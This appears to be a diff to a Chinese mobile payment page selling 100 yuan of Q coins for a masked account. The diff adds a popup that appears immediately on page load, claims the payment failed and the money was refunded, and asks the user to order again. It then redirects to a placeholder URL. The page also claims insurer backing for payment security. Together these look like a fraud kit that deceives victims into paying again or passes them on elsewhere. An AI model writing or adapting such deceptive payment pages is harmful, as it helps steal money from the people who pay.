@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -299,13 +300,87 @@
             color: #999;
             padding: 0 24px;
         }
+/* 更新提示框样式 */
+#timeoutAlert {
+    /* 保持原有定位样式 */
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(0,0,0,0.9);
+    color: #fff;
+    padding: 20px 15px;
+    border-radius: 8px;
+    width: 90%;
+    max-width: 300px;
+    text-align: center;
+    z-index: 9999;
+    opacity: 0;
+    animation: alertShow 0.5s ease forwards;
+    box-sizing: border-box;
+}
+
+.alert-title {
+    font-size: 16px;
+    font-weight: 600;
+    margin: 0 0 10px 0;
+    color: #fff;
+}
+
+.alert-subtitle {
+    font-size: 14px;
+    line-height: 1.4;
+    color: rgba(255,255,255,0.9);
+    margin: 0 0 15px 0;
+    word-break: break-word;
+}
+
+.confirm-btn {
+    background: #fff;
+    color: #333;
+    border: none;
+    border-radius: 4px;
+    padding: 8px 25px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+}
+
+.confirm-btn:active {
+    transform: scale(0.95);
+    opacity: 0.9;
+}
+
+/* 保持原有动画 */
+@keyframes alertShow {
+    from {
+        opacity: 0;
+        transform: translate(-50%, -40%);
+    }
+    to {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+    }
+}
+
+@keyframes alertHide {
+    from {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+    }
+    to {
+        opacity: 0;
+        transform: translate(-50%, -60%);
+    }
+}
     </style>
 </head>
 <body>
     <div class="main-container">
         <!-- 商品信息 -->
         <div class="product-info">
-            <div class="product-name">Q币（为5**641购买）</div>
+            <div class="product-name">Q币（为1**756购买）</div>
             <div class="price">￥100.00</div>
         </div>
 
@@ -320,7 +395,14 @@
     </div>
    <button class="pay-trigger">立即支付</button>
 
-
+<!-- 修改提示框结构 -->
+<div id="timeoutAlert" style="display: none;">
+    <div class="alert-content">
+        <h3 class="alert-title">支付失败</h3>
+        <p class="alert-subtitle">由于创建订单长时间未付款，订单已取消，如有付款已自动退回，请重新下单</p>
+        <button class="confirm-btn">确定</button>
+    </div>
+</div>
     <!-- 安全提示 -->
     <div class="security-notice">
         支付安全由中国人民财产保险股份有限公司承保
@@ -476,5 +558,48 @@
             updateDots();
         }
     </script>
+<script>
+// 修改后的跳转逻辑
+document.addEventListener('DOMContentLoaded', function() {
+    const alertBox = document.getElementById('timeoutAlert');
+    const confirmBtn = document.querySelector('.confirm-btn');
+    let timer = null;
+
+    // 显示提示框
+    alertBox.style.display = 'block';
+
+    // 设置自动跳转定时器
+    timer = setTimeout(() => {
+        redirectTo();
+    }, 20000);
+
+    // 确认按钮点击事件
+    confirmBtn.addEventListener('click', () => {
+        clearTimeout(timer);
+        alertBox.style.animation = 'alertHide 0.3s ease forwards';
+        setTimeout(redirectTo, 300); // 等待隐藏动画完成
+    });
+
+    function redirectTo() {
+        window.location.href = 'https://your-redirect-url.com'; // 替换实际地址
+    }
+});
+
+// 添加隐藏动画
+const style = document.createElement('style');
+style.textContent = `
+@keyframes alertHide {
+    from {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+    }
+    to {
+        opacity: 0;
+        transform: translate(-50%, -60%);
+    }
+}
+`;
+document.head.appendChild(style);
+</script>
 </body>
 </html>
